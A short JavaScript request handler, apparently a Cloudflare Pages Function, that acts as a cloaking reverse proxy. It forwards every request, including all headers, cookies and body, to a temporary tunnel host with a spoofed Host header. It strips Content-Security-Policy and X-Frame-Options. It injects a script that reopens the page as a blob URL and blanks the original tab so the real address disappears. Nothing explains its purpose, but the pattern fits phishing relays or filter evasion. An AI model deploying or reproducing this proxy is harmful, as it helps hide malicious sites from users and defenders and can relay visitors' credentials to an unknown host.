export async function onRequest(context) {
  const incomingUrl = new URL(context.request.url)

  if (incomingUrl.searchParams.get('_blob') === '1') {
    const cleanUrl = new URL("https://experiment-cultures-unexpected-sympathy.trycloudflare.com")
    cleanUrl.pathname = incomingUrl.pathname || ""
    const headers = new Headers(context.request.headers)
    headers.set("host", "6c642c4f7a9fbc4c1939eccc19418e91.loophole.site")
    return fetch(cleanUrl.toString(), {
      method: context.request.method,
      headers,
      body: context.request.body
    })
  }

  const target = new URL("https://experiment-cultures-unexpected-sympathy.trycloudflare.com")
  target.pathname = incomingUrl.pathname || ""
  target.search = incomingUrl.search

  const headers = new Headers(context.request.headers)
  headers.set("host", "6c642c4f7a9fbc4c1939eccc19418e91.loophole.site")

  const response = await fetch(target.toString(), {
    method: context.request.method,
    headers,
    body: context.request.body
  })

  const contentType = response.headers.get("content-type") || ""
  if (!contentType.includes("text/html")) return response

  let html = await response.text()

  const blobPageUrl = incomingUrl.origin + incomingUrl.pathname + '?_blob=1'

  const script = `
<script>
  (function() {
    if (sessionStorage.getItem('_popped')) return;
    sessionStorage.setItem('_popped', '1');

    fetch('${blobPageUrl}')
      .then(r => r.text())
      .then(pageHtml => {
        const blob = new Blob([pageHtml], { type: 'text/html' });
        const blobUrl = URL.createObjectURL(blob);

        // Open the real content in a new blob tab
        const newTab = window.open(blobUrl, '_blank');

        // Replace current tab history with about:blank so the URL disappears
        history.replaceState(null, '', 'about:blank');

        // Redirect original tab to about:blank
        window.location.replace('about:blank');

        setTimeout(() => URL.revokeObjectURL(blobUrl), 5000);
      });
  })();
<\/script>`

  if (/<\/head>/i.test(html)) {
    html = html.replace(/<\/head>/i, script + '</head>')
  } else {
    html = script + html
  }

  const newHeaders = new Headers(response.headers)
  newHeaders.delete("content-security-policy")
  newHeaders.delete("content-security-policy-report-only")
  newHeaders.delete("x-frame-options")
  newHeaders.set("content-type", "text/html; charset=utf-8")

  return new Response(html, {
    status: response.status,
    headers: newHeaders
  })
}
